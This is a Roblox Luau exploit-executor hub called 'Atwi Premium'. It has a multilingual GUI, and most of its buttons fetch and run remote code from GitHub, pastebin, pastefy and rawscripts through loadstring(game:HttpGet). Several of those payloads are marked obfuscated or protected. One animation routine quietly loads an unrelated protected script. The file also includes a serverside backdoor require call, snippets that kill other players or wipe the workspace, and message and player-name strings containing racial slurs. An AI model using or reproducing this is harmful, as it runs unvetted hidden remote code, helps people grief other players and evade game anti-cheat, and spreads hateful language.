local MainGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local LangFrame = Instance.new("Frame")
local InfoFrame = Instance.new("Frame")
local titleLabel = Instance.new("TextLabel")
local codeBox = Instance.new("ScrollingFrame")
local codeInput = Instance.new("TextBox")
local runBtn = Instance.new("TextButton")
local consoleBtn = Instance.new("TextButton")
local clearBtn = Instance.new("TextButton")
local hideBtn = Instance.new("TextButton")
local showBtn = Instance.new("TextButton")
local infoBtn = Instance.new("TextButton")
local r6Btn = Instance.new("TextButton")
local morphList = Instance.new("ScrollingFrame")
local scriptsList = Instance.new("ScrollingFrame")
local requiresList = Instance.new("ScrollingFrame")
local mapsList = Instance.new("ScrollingFrame")
local morphLabel = Instance.new("TextLabel")
local scriptsLabel = Instance.new("TextLabel")
local requiresLabel = Instance.new("TextLabel")
local mapsLabel = Instance.new("TextLabel")
local layout1 = Instance.new("UIListLayout")
local layout2 = Instance.new("UIListLayout")
local layout3 = Instance.new("UIListLayout")
local layout4 = Instance.new("UIListLayout")
local colorObjects = {}
local function addColor(obj, prop)
table.insert(colorObjects, {Object = obj, Property = prop})
end
local openSound = Instance.new("Sound")
openSound.SoundId = "rbxassetid://125381464159839"
openSound.Volume = 0.2
openSound.Parent = game.Workspace
local clickSound = Instance.new("Sound")
clickSound.SoundId = "rbxassetid://138567614125924"
clickSound.Volume = 0.2
clickSound.Parent = game.Workspace
local function playClick()
clickSound:Play()
end
MainGui.Name = "idkWhatNameThis"
MainGui.Parent = game.CoreGui
MainGui.ResetOnSpawn = false
LangFrame.Name = "LangSelector"
LangFrame.Parent = MainGui
LangFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LangFrame.BackgroundTransparency = 0.4
LangFrame.BorderSizePixel = 0
LangFrame.Size = UDim2.new(0, 280, 0, 280)
LangFrame.Position = UDim2.new(0.5, -140, 0, -350)
LangFrame.Active = true
LangFrame.Draggable = false
local LangTitle = Instance.new("TextLabel", LangFrame)
LangTitle.Size = UDim2.new(1, 0, 0, 35)
LangTitle.BackgroundTransparency = 1
LangTitle.Text = "SELECT LANGUAGE"
LangTitle.TextColor3 = Color3.new(0, 0, 0)
LangTitle.Font = Enum.Font.Arcade
LangTitle.TextSize = 18
local LangScroll = Instance.new("ScrollingFrame", LangFrame)
LangScroll.Size = UDim2.new(1, -20, 1, -45)
LangScroll.Position = UDim2.new(0, 10, 0, 40)
LangScroll.BackgroundTransparency = 1
LangScroll.CanvasSize = UDim2.new(0, 0, 0, 350)
LangScroll.ScrollBarThickness = 4
local LangLayout = Instance.new("UIListLayout", LangScroll)
LangLayout.Padding = UDim.new(0, 5)
LangLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
local copyBtn = Instance.new("TextButton")
local updatesText = Instance.new("TextLabel")

local infoTextLabel = Instance.new("TextLabel")
infoTextLabel.Parent = InfoFrame
infoTextLabel.Size = UDim2.new(1, -40, 1, -80)
infoTextLabel.Position = UDim2.new(0, 20, 0, 40)
infoTextLabel.BackgroundTransparency = 1
infoTextLabel.TextColor3 = Color3.new(0, 0, 0)
infoTextLabel.Font = Enum.Font.Arcade
infoTextLabel.TextSize = 16
infoTextLabel.TextXAlignment = Enum.TextXAlignment.Right
infoTextLabel.TextYAlignment = Enum.TextYAlignment.Top
infoTextLabel.Text = "designed: atwi\ndevloper: atwi\nsounds: atwi\nmorph and scripts: atwi\nrequires: atwi\nphotos: atwi"

local copyrightLabel = Instance.new("TextLabel")
copyrightLabel.Parent = InfoFrame
copyrightLabel.Size = UDim2.new(0, 100, 0, 20)
copyrightLabel.Position = UDim2.new(1, -110, 1, -30)
copyrightLabel.BackgroundTransparency = 1
copyrightLabel.TextColor3 = Color3.new(0, 0, 0)
copyrightLabel.TextTransparency = 0.4
copyrightLabel.Font = Enum.Font.Arcade
copyrightLabel.TextSize = 12
copyrightLabel.TextXAlignment = Enum.TextXAlignment.Right
copyrightLabel.Text = "© atwi"

local function createLangOption(name, langCode)
local btn = Instance.new("TextButton", LangScroll)
btn.Size = UDim2.new(0, 180, 0, 30)
btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
btn.BackgroundTransparency = 0.2
btn.BorderSizePixel = 0
btn.Text = name
btn.Font = Enum.Font.Arcade
btn.TextSize = 14
btn.TextColor3 = Color3.new(0, 0, 0)
btn.MouseButton1Click:Connect(function()
playClick()
local translations = {
ar = {"السكربتات", "المظاهر", "تشغيل", "مسح", "فتح", "معلومات", "Atwi Premium [المستوى 8]", "اضغط لنسخ حساب المطور", "التحديثات:\nإضافة سكربتات\nواجهة جديدة\nالتحديث القادم:\nحذف الحماية\nسيرفر سايد"},
en = {"Scripts", "Morph", "Execute", "Clear", "OPEN", "info", "Atwi Premium Version [Level 8]", "click to copy developer account", "updates:\nAdd scripts\nAdd new Gui\nnext update:\nremove anti-cheat\nadd serverside"},
ru = {"Скрипты", "Морфы", "Выполнить", "Очистить", "ОТКРЫТЬ", "Инфо", "Atwi Premium [Уровень 8]", "копировать аккаунт разработчика", "обновления:\nскрипты\nновый интерфейс\nскоро:\nанти-чит\nсерверсайд"},
ch = {"脚本", "变形", "执行", "清除", "打开", "信息", "Atwi Premium [第 8 级]", "点击复制开发者账号", "更新：\n添加脚本\n新界面\n下次更新：\n删除反作弊\n添加服务端"},
es = {"Scripts", "Morfosis", "Ejecutar", "Limpiar", "ABRIR", "Info", "Atwi Premium [Nivel 8]", "copiar cuenta del desarrollador", "actualizaciones:\nScripts\nNueva interfaz\npróxima:\ainticheat\nserverside"},
fr = {"Scripts", "Morphose", "Exécuter", "Effacer", "OUVRIR", "Info", "Atwi Premium [Nivel 8]", "copier le compte développeur", "mises à jour:\nScripts\nNouveau Gui\nprochain:\nanti-triche\nserverside"},
de = {"Skripte", "Morph", "Ausführen", "Löschen", "ÖFFNEN", "Info", "Atwi Premium [Level 8]", "Entwickler-Konto kopieren", "Updates:\nSkripte\nNeues Gui\nnächstes:\nAnti-Cheat\nServerside"},
jp = {"スクリプト", "変身", "実行", "クリア", "開く", "情報", "Atwi Premium [レベル 8]", "開発者アカウントをコピー", "更新：\nスクリプト追加\n新GUI\n次回：\nアンチチート削除\nサーバーサイド"}
}
local t = translations[langCode]
if not t then t = translations["en"] end
scriptsLabel.Text = t[1]
morphLabel.Text = t[2]
runBtn.Text = t[3]
clearBtn.Text = t[4]
showBtn.Text = t[5]
infoBtn.Text = t[6]
titleLabel.Text = t[7]
copyBtn.Text = t[8]
updatesText.Text = t[9]
if langCode == "ar" then
scriptsLabel.Font = Enum.Font.SciFi
morphLabel.Font = Enum.Font.SciFi
runBtn.Font = Enum.Font.SciFi
clearBtn.Font = Enum.Font.SciFi
showBtn.Font = Enum.Font.SciFi
infoBtn.Font = Enum.Font.SciFi
titleLabel.Font = Enum.Font.SciFi
copyBtn.Font = Enum.Font.SciFi
updatesText.Font = Enum.Font.SciFi
infoTextLabel.Font = Enum.Font.SciFi
copyrightLabel.Font = Enum.Font.SciFi
else
scriptsLabel.Font = Enum.Font.Arcade
morphLabel.Font = Enum.Font.Arcade
runBtn.Font = Enum.Font.Arcade
clearBtn.Font = Enum.Font.Arcade
showBtn.Font = Enum.Font.Arcade
infoBtn.Font = Enum.Font.Arcade
titleLabel.Font = Enum.Font.Arcade
copyBtn.Font = Enum.Font.Arcade
updatesText.Font = Enum.Font.Arcade
infoTextLabel.Font = Enum.Font.Arcade
copyrightLabel.Font = Enum.Font.Arcade
end
openSound:Play()
LangFrame:TweenPosition(UDim2.new(0.5, -140, 0, -350), "In", "Back", 0.5, true, function()
LangFrame.Visible = false
MainFrame.Visible = true
MainFrame:TweenPosition(UDim2.new(0.5, 0, 0.5, 0), "Out", "Quad", 0.5, true)
end)
end)
end
createLangOption("العربية", "ar")
createLangOption("English", "en")
createLangOption("Русский", "ru")
createLangOption("中国人", "ch")
createLangOption("Español", "es")
createLangOption("Français", "fr")
createLangOption("Deutsch", "de")
createLangOption("日本語", "jp")
LangFrame.Position = UDim2.new(0.5, -140, 0, -350)
LangFrame:TweenPosition(UDim2.new(0.5, -140, 0.5, -140), "Out", "Back", 0.6, true)
local function sendNotif(title, body, dur)
pcall(function()
game:GetService("StarterGui"):SetCore("SendNotification", {
Title = title,
Text = body,
Icon = "rbxassetid://90800839466219",
Duration = dur or 5
})
end)
end
sendNotif("Welcome!, Creator the script is atwi", 10)
MainFrame.Parent = MainGui
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BackgroundTransparency = 0.4
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Size = UDim2.new(0, 745, 0, 240)
MainFrame.Position = UDim2.new(0.5, 0, 1.5, 0)
MainFrame.ZIndex = 1
MainFrame.Visible = false
local iconImg = Instance.new("ImageLabel")
iconImg.Parent = MainFrame
iconImg.Size = UDim2.new(0, 20, 0, 20)
iconImg.Position = UDim2.new(0, 6, 0, 6)
iconImg.BackgroundTransparency = 1
iconImg.Image = "rbxassetid://90800839466219"
iconImg.ZIndex = 10
infoBtn.Parent = MainFrame
infoBtn.Size = UDim2.new(0, 50, 0, 20)
infoBtn.Position = UDim2.new(0, 32, 0, 6)
infoBtn.Font = Enum.Font.Arcade
infoBtn.TextColor3 = Color3.new(0, 0, 0)
infoBtn.TextScaled = true
infoBtn.ZIndex = 5
infoBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
infoBtn.BackgroundTransparency = 0.2
infoBtn.BorderSizePixel = 0
r6Btn.Parent = MainFrame
r6Btn.Size = UDim2.new(0, 35, 0, 20)
r6Btn.Position = UDim2.new(0, 88, 0, 6)
r6Btn.Font = Enum.Font.Arcade
r6Btn.Text = "R6"
r6Btn.TextColor3 = Color3.new(0, 0, 0)
r6Btn.TextScaled = true
r6Btn.ZIndex = 5
r6Btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
r6Btn.BackgroundTransparency = 0.2
r6Btn.BorderSizePixel = 0
r6Btn.MouseButton1Click:Connect(function()
playClick()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua", true))()
end)
InfoFrame.Parent = MainGui
InfoFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InfoFrame.BackgroundTransparency = 0.4
InfoFrame.BorderSizePixel = 0
InfoFrame.AnchorPoint = Vector2.new(0.5, 0.5)
InfoFrame.Size = UDim2.new(0, 480, 0, 240)
InfoFrame.Position = UDim2.new(0.5, 0, 1.5, 0)
InfoFrame.Visible = false
InfoFrame.Active = true
InfoFrame.Draggable = true
local backBtn = Instance.new("TextButton")
backBtn.Parent = InfoFrame
backBtn.Size = UDim2.new(0, 25, 0, 25)
backBtn.Position = UDim2.new(0, 15, 1, -40)
backBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
backBtn.BorderSizePixel = 0
backBtn.Text = "X"
backBtn.TextColor3 = Color3.new(1,1,1)
backBtn.TextScaled = true
hideBtn.Parent = MainFrame
hideBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
hideBtn.Position = UDim2.new(1, -26, 0, 6)
hideBtn.Size = UDim2.new(0, 20, 0, 20)
hideBtn.BorderSizePixel = 0
hideBtn.Text = "X"
hideBtn.TextColor3 = Color3.new(1, 1, 1)
hideBtn.TextScaled = true
hideBtn.ZIndex = 10
showBtn.Parent = MainGui
showBtn.Position = UDim2.new(0.02, 0, 0.85, 0)
showBtn.Size = UDim2.new(0, 80, 0, 35)
showBtn.TextColor3 = Color3.new(0, 0, 0)
showBtn.Font = Enum.Font.Arcade
showBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
showBtn.BackgroundTransparency = 0.4
showBtn.BorderSizePixel = 0
showBtn.Visible = false
hideBtn.MouseButton1Click:Connect(function()
playClick()
MainFrame:TweenPosition(UDim2.new(0.5, 0, 1.5, 0), "In", "Quad", 0.5, true, function()
showBtn.Visible = true
end)
end)
showBtn.MouseButton1Click:Connect(function()
playClick()
showBtn.Visible = false
MainFrame:TweenPosition(UDim2.new(0.5, 0, 0.5, 0), "Out", "Quad", 0.5, true)
end)
infoBtn.MouseButton1Click:Connect(function()
playClick()
MainFrame:TweenPosition(UDim2.new(0.5, 0, 1.5, 0), "In", "Quad", 0.4, true, function()
MainFrame.Visible = false
InfoFrame.Visible = true
InfoFrame:TweenPosition(UDim2.new(0.5, 0, 0.5, 0), "Out", "Quad", 0.4, true)
end)
end)
backBtn.MouseButton1Click:Connect(function()
playClick()
InfoFrame:TweenPosition(UDim2.new(0.5, 0, 1.5, 0), "In", "Quad", 0.4, true, function()
InfoFrame.Visible = false
MainFrame.Visible = true
MainFrame:TweenPosition(UDim2.new(0.5, 0, 0.5, 0), "Out", "Quad", 0.4, true)
end)
end)
titleLabel.Parent = MainFrame
titleLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(0, 380, 0, 30)
titleLabel.Position = UDim2.new(0.5, -190, 0, 4)
titleLabel.Font = Enum.Font.Arcade
titleLabel.TextScaled = true
titleLabel.ZIndex = 2
titleLabel.TextColor3 = Color3.new(0, 0, 0)
scriptsLabel.Parent = MainFrame
scriptsLabel.Size = UDim2.new(0, 135, 0, 20)
scriptsLabel.Position = UDim2.new(0, 10, 0, 35)
scriptsLabel.BackgroundTransparency = 1
scriptsLabel.Font = Enum.Font.Arcade
scriptsLabel.TextScaled = true
scriptsLabel.TextColor3 = Color3.new(0, 0, 0)
scriptsList.Parent = MainFrame
scriptsList.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scriptsList.BackgroundTransparency = 0.6
scriptsList.BorderSizePixel = 0
scriptsList.Position = UDim2.new(0, 10, 0, 60)
scriptsList.Size = UDim2.new(0, 135, 0, 170)
scriptsList.AutomaticCanvasSize = Enum.AutomaticSize.Y
layout2.Parent = scriptsList
layout2.Padding = UDim.new(0, 5)
local function AddScriptBtn(parent, name, callback)
local btn = Instance.new("TextButton")
btn.Parent = parent
btn.Size = UDim2.new(1, -10, 0, 28)
btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
btn.BackgroundTransparency = 0.3
btn.BorderSizePixel = 0
btn.Font = Enum.Font.Arcade
btn.Text = name
btn.TextScaled = true
btn.TextColor3 = Color3.new(0, 0, 0)
btn.MouseButton1Click:Connect(function()
playClick()
callback()
end)
end
AddScriptBtn(scriptsList, "Young Sheldon Gui", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SpdmXDev/luascripts/refs/heads/main/young"))() end)
AddScriptBtn(scriptsList, "Project", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SpdmXDev/luascripts/refs/heads/main/project"))() end)
AddScriptBtn(scriptsList, "Project Atwx", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SpdmXDev/luascripts/refs/heads/main/obfuscated_script-1779111674937.lua.txt"))() end)
AddScriptBtn(scriptsList, "ro-xploit 4.0", function()
loadstring(game:GetObjects("rbxassetid://175137115")[1].Source)()
end)
AddScriptBtn(scriptsList, "Atwi Ultimate", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SpdmXDev/luascripts/refs/heads/main/atwiultimate"))() end)
AddScriptBtn(scriptsList, "PP", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SpdmXDev/luascripts/main/obfuscated_script-1777589010962.lua.txt"))() end)
AddScriptBtn(scriptsList, "Your Mom Gui", function() loadstring(game:GetObjects('rbxassetid://289110135')[1].Source)() end)
AddScriptBtn(scriptsList, "Infinite Yield", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
AddScriptBtn(scriptsList, "d!ck Gun", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SpdmXDev/luascripts/main/obfuscated_script-1777573717692.lua.txt"))() end)
AddScriptBtn(scriptsList, "D!ck All", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SpdmXDev/luascripts/main/obfuscated_script-177757429716.lua.txt"))() end)
AddScriptBtn(scriptsList, "D!ck", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SpdmXDev/luascripts/main/obfuscated_script-1777575459958.lua.txt"))() end)
AddScriptBtn(scriptsList, "Windows Gui", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SpdmXDev/luascripts/main/obfuscated_script-1777575390013.lua.txt"))() end)
AddScriptBtn(scriptsList, "MLG Gun", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SpdmXDev/luascripts/main/MLG%20Gun%20Script%20ROBLOX.txt"))() end)
AddScriptBtn(scriptsList, "SB Shotgun", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SpdmXDev/luascripts/main/SB%20Shotgun.txt"))() end)
AddScriptBtn(scriptsList, "c00lkid", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SpdmXDev/luascripts/main/c00lkid.txt"))() end)
AddScriptBtn(scriptsList, "gooby", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SpdmXDev/luascripts/main/gooby.txt"))() end)
AddScriptBtn(scriptsList, "2007 Animation[R6]", function()
game.Players.LocalPlayer.Character:BreakJoints()
game.Players.LocalPlayer.Character=nil
local Connection = game.Workspace.DescendantAdded:Connect(function(c)
if c.Name == "Animate" then
c.Disabled=true
end
end)
repeat wait() until game.Players.LocalPlayer.Character
local Char = game.Players.LocalPlayer.Character
local Died; Died = game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Died:Connect(function()
Connection:Disconnect()
Died:Disconnect()
end)
wait(.1)
local function waitForChild(parent, childName)
local child = parent:findFirstChild(childName)
if child then return child end
while true do
child = parent.ChildAdded:wait()
if child.Name==childName then return child end
end
end
wait(0.1)
game.StarterGui:SetCore("SendNotification", {
Title = "youtube.com/@atwi_devloper";
Text = "pls follow me brother";
Duration = 5;
})
local Figure = game.Players.LocalPlayer.Character
local Torso = waitForChild(Figure, "Torso")
local RightShoulder = waitForChild(Torso, "Right Shoulder")
local LeftShoulder = waitForChild(Torso, "Left Shoulder")
local RightHip = waitForChild(Torso, "Right Hip")
local LeftHip = waitForChild(Torso, "Left Hip")
local Neck = waitForChild(Torso, "Neck")
local Humanoid = waitForChild(Figure, "Humanoid")
local pose = "Standing"
local toolAnim = "None"
local toolAnimTime = 0
local jumpMaxLimbVelocity = 0.75
local function onRunning(speed) if speed>0 then pose = "Running" else pose = "Standing" end end
local function onDied() pose = "Dead" end
local function onJumping() pose = "Jumping" end
local function onClimbing() pose = "Climbing" end
local function onGettingUp() pose = "GettingUp" end
local function onFreeFall() pose = "FreeFall" end
local function onFallingDown() pose = "FallingDown" end
local function onSeated() pose = "Seated" end
local function onPlatformStanding() pose = "PlatformStanding" end
local function onSwimming(speed) if speed>0 then pose = "Running" else pose = "Standing" end end
local function moveJump()
RightShoulder.MaxVelocity = jumpMaxLimbVelocity
LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
RightShoulder:SetDesiredAngle(3.14)
LeftShoulder:SetDesiredAngle(-3.14)
RightHip:SetDesiredAngle(0)
LeftHip:SetDesiredAngle(0)
end
local function moveFreeFall()
RightShoulder.MaxVelocity = jumpMaxLimbVelocity
LeftShoulder.MaxVelocity = jumpMaxLimbVelocity
RightShoulder:SetDesiredAngle(3.14)
LeftShoulder:SetDesiredAngle(-3.14)
RightHip:SetDesiredAngle(0)
LeftHip:SetDesiredAngle(0)
end
local function moveSit()
RightShoulder.MaxVelocity = 0.15
LeftShoulder.MaxVelocity = 0.15
RightShoulder:SetDesiredAngle(3.14 /2)
LeftShoulder:SetDesiredAngle(-3.14 /2)
RightHip:SetDesiredAngle(3.14 /2)
LeftHip:SetDesiredAngle(-3.14 /2)
end
local function getTool()
for _, kid in ipairs(Figure:GetChildren()) do
if kid.className == "Tool" then return kid end
end
return nil
end
local function getToolAnim(tool)
for _, c in ipairs(tool:GetChildren()) do
if c.Name == "toolanim" and c.className == "StringValue" then return c end
end
return nil
end
local function animateTool()
if (toolAnim == "None") then RightShoulder:SetDesiredAngle(1.57) return end
if (toolAnim == "Slash") then RightShoulder.MaxVelocity = 0.5 RightShoulder:SetDesiredAngle(0) return end
if (toolAnim == "Lunge") then
RightShoulder.MaxVelocity = 0.5
LeftShoulder.MaxVelocity = 0.5
RightHip.MaxVelocity = 0.5
LeftHip.MaxVelocity = 0.5
RightShoulder:SetDesiredAngle(1.57)
LeftShoulder:SetDesiredAngle(1.0)
RightHip:SetDesiredAngle(1.57)
LeftHip:SetDesiredAngle(1.0)
return
end
end
local function move(time)
local amplitude
local frequency
if (pose == "Jumping") then moveJump() return end
if (pose == "FreeFall") then moveFreeFall() return end
if (pose == "Seated") then moveSit() return end
local climbFudge = 0
if (pose == "Running") then
if (RightShoulder.CurrentAngle > 1.5 or RightShoulder.CurrentAngle < -1.5) then RightShoulder.MaxVelocity = jumpMaxLimbVelocity else RightShoulder.MaxVelocity = 0.15 end
if (LeftShoulder.CurrentAngle > 1.5 or LeftShoulder.CurrentAngle < -1.5) then LeftShoulder.MaxVelocity = jumpMaxLimbVelocity else LeftShoulder.MaxVelocity = 0.15 end
amplitude = 1
frequency = 9
elseif (pose == "Climbing") then
RightShoulder.MaxVelocity = 0.5
LeftShoulder.MaxVelocity = 0.5
amplitude = 1
frequency = 9
climbFudge = 3.14
else
amplitude = 0.1
frequency = 1
end
local desiredAngle = amplitude * math.sin(time*frequency)
RightShoulder:SetDesiredAngle(desiredAngle + climbFudge)
LeftShoulder:SetDesiredAngle(desiredAngle - climbFudge)
RightHip:SetDesiredAngle(-desiredAngle)
LeftHip:SetDesiredAngle(-desiredAngle)
local tool = getTool()
if tool then
local animStringValueObject = getToolAnim(tool)
if animStringValueObject then
toolAnim = animStringValueObject.Value
animStringValueObject.Parent = nil
toolAnimTime = time + .3
end
if time > toolAnimTime then
toolAnimTime = 0
toolAnim = "None"
end
animateTool()
else
toolAnim = "None"
toolAnimTime = 0
end
end
Humanoid.Died:connect(onDied)
Humanoid.Running:connect(onRunning)
Humanoid.Jumping:connect(onJumping)
Humanoid.Climbing:connect(onClimbing)
Humanoid.GettingUp:connect(onGettingUp)
Humanoid.FreeFalling:connect(onFreeFall)
Humanoid.FallingDown:connect(onFallingDown)
Humanoid.Seated:connect(onSeated)
Humanoid.PlatformStanding:connect(onPlatformStanding)
Humanoid.Swimming:connect(onSwimming)
loadstring(game:HttpGet("https://raw.githubusercontent.com/h4xal0t/wtf/main/Protected_9909131513277395.lua.txt"))()
local runService = game:service("RunService");
while Figure.Parent~=nil do
local _, time = wait(0.1)
move(time)
end
end)
AddScriptBtn(scriptsList, "Krusty Krab F3X Map", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Krusty-Krab-F3X-MAP-149096"))() end)
AddScriptBtn(scriptsList, "skeleton sky", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-skeleton-sky-10383"))() end)
AddScriptBtn(scriptsList, "prison life f3x map", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-PRISON-LIFE-F3X-MAP-BY-WXA-138601"))() end)
AddScriptBtn(scriptsList, "head shake", function()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local torso = character:WaitForChild("Torso")
local neck = torso:WaitForChild("Neck")
local baseC0 = neck.C0
local amplitude = 0.6
local speed = 4
local t = 0
RunService.RenderStepped:Connect(function(dt)
t += dt
local xOffset = math.sin(t * speed) * amplitude
neck.C0 = baseC0 * CFrame.new(xOffset, 0, 0)
end)
end)
AddScriptBtn(scriptsList, "snoop dog face all", function()
for i,v in pairs(game.Players:GetChildren()) do
if v.Character:FindFirstChild("Head") then
local gui1 = Instance.new("BillboardGui")
gui1.Parent = v.Character.Head
gui1.Adornee = v.Character.Head
gui1.Size = UDim2.new(2.5,0,2.5,0)
gui1.StudsOffset = Vector3.new(0,0.2,0)
gui1.AlwaysOnTop = true
local text1 = Instance.new("ImageLabel")
text1.Image = "http://www.roblox.com/asset/?id=125148536957515"
text1.Size = UDim2.new(1,0,1,0)
text1.Position = UDim2.new(0,0,0,0)
text1.BackgroundTransparency = 1
text1.Parent = gui1
v.Character.Head.Transparency = 1
end
end
end)
AddScriptBtn(scriptsList, "spongebob sky", function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-spongebob-skybox-by-wind0ws-211657"))()
end)
AddScriptBtn(scriptsList, "fnaf 1 map f3x", function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FNAF-1-MAP-F3X-BY-WXA-x-X9D-146427"))()
end)
AddScriptBtn(scriptsList, "snoop dogg sky box by atwi", function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-snoop-dogg-skybox-by-atwi-220242"))()
end)
AddScriptBtn(scriptsList, "you are an idiot f3x", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/SpdmXDev/luascripts/refs/heads/main/youareanidiot"))() end)
AddScriptBtn(scriptsList, "printidentify", function() codeInput.Text = "printidentify()" end)
AddScriptBtn(scriptsList, "warn('hi')", function() codeInput.Text = "warn('hi')" end)
AddScriptBtn(scriptsList, "print('hi')", function() codeInput.Text = "print('hi')" end)
AddScriptBtn(scriptsList, "WalkSpeed 100", function() codeInput.Text = "game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100" end)
AddScriptBtn(scriptsList, "Health 0", function() codeInput.Text = "game.Players.LocalPlayer.Character.Humanoid.Health = 0" end)
AddScriptBtn(scriptsList, "BreakJoints Player", function() codeInput.Text = 'local player = "nigger"\nlocal character = game.Players[player].Character\nif character then\n    character:BreakJoints()\nend' end)
AddScriptBtn(scriptsList, "BreakJoints Local", function() codeInput.Text = "game.Players.LocalPlayer.Character:BreakJoints()" end)
AddScriptBtn(scriptsList, "ClearWorkspace", function() codeInput.Text = "workspace:ClearAllChildren()" end)
AddScriptBtn(scriptsList, "Kill Player Name", function() codeInput.Text = 'local player = "name here"\ngame.Players[player].Character.Humanoid.Health =  0' end)
AddScriptBtn(scriptsList, "Spin Script", function() codeInput.Text = "local plr = game.Players.LocalPlayer\nlocal character = plr.Character or plr.CharacterAdded:Wait()\nlocal humanoidRootPart = character:WaitForChild('HumanoidRootPart')\nlocal ws = 500\nlocal function spin()\n    while true do\n        humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(0, math.rad(ws), 0)\n        wait(0.1)\n    end\nend\nspin()" end)
AddScriptBtn(scriptsList, "Empty Function", function() codeInput.Text = "a = function() end\nprint(a)" end)
AddScriptBtn(scriptsList, "Chat Rights", function() codeInput.Text = "game.Chat:Chat(game.Players.LocalPlayer.Character.Head, 'atwi')" end)
AddScriptBtn(scriptsList, "Remove NameUI", function() codeInput.Text = "game.Players.LocalPlayer.PlayerGui['NameUI'..game.Players.LocalPlayer.Name]:Remove()" end)
AddScriptBtn(scriptsList, "Zero Gravity R6", function() codeInput.Text = "game.Workspace.Gravity = 0\nHumanoid.RigType = Enum.HumanoidRigType.r6" end)
AddScriptBtn(scriptsList, "Message 1", function() codeInput.Text = "local a = Instance.new('Message')\na.Text = 'go fuck yourself'\na.Parent = workspace\nwait(3)\na:Destroy()" end)
AddScriptBtn(scriptsList, "Message 2", function() codeInput.Text = "local a = Instance.new('Message')\na.Text = 'ambatukam'\na.Parent = workspace\nwait(4)\na.Text = 'Nigger93 World Tour'\nWait(5)\na:Destroy()" end)
AddScriptBtn(scriptsList, "Teleport All", function() codeInput.Text = "wait('2')\nlocal gameId = \n\nfor i, Player in pairs(game.Players:GetPlayers()) do\n    if Player:IsA('Player') then\n        game:GetService('TeleportService'):Teleport(gameId, Player)\n    end\nend" end)
AddScriptBtn(scriptsList, "R15 to R6 Morph", function() codeInput.Text = "local plr = game:GetService('Players'):FindFirstChild('Username')\nif plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then\n            local Main = game.Players:GetHumanoidDescriptionFromUserId(plr.CharacterAppearanceId)\n            local morph = game.Players:CreateHumanoidModelFromDescription(Main, Enum.HumanoidRigType.R6)\n            morph:SetPrimaryPartCFrame(plr.Character.PrimaryPart.CFrame)\n            morph.Name = plr.Name\n            plr.Character = morph\n            morph.Parent = workspace    \nend" end)
AddScriptBtn(scriptsList, "unknown 339", function() loadstring(game:HttpGet("https://pastefy.app/JmaD2ivk/raw"))() end)
AddScriptBtn(scriptsList, "unknown 714", function() loadstring(game:HttpGet("https://pastefy.app/pGsL1BN4/raw"))() end)
AddScriptBtn(scriptsList, "unknown 552", function() loadstring(game:HttpGet('https://pastebin.com/raw/CVecVrT1'))() end)
AddScriptBtn(scriptsList, "unknown 194", function() loadstring(game:HttpGet("https://pastebin.com"))() end)
AddScriptBtn(scriptsList, "unknown 441", function() loadstring(game:HttpGet("https://pastebin.com/raw/nashLv7j"))() end)
AddScriptBtn(scriptsList, "unknown 289", function() loadstring(game:HttpGet("https://pastebin.com/raw/Wmn2GRzi"))() end)
AddScriptBtn(scriptsList, "unknown 310", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/shawulplayz/ScriptTesting/refs/heads/main/Stigma-Remake-ServerSide"))() end)
AddScriptBtn(scriptsList, "unknown 802", function() loadstring(game:HttpGet("https://pastebin.com/raw/eMakNZg0"))() end)
AddScriptBtn(scriptsList, "unknown 164", function() loadstring(game:HttpGet("https://pastebin.com/raw/B8BzBdf0"))() end)
AddScriptBtn(scriptsList, "Solara Hub", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/samuraa1/Solara-Hub/refs/heads/main/Solara%20Hub.lua"))() end)
AddScriptBtn(requiresList, "unknown 472", function() codeInput.Text = 'loadstring(require(87872085491874):dominiuslol("user"))()' end)
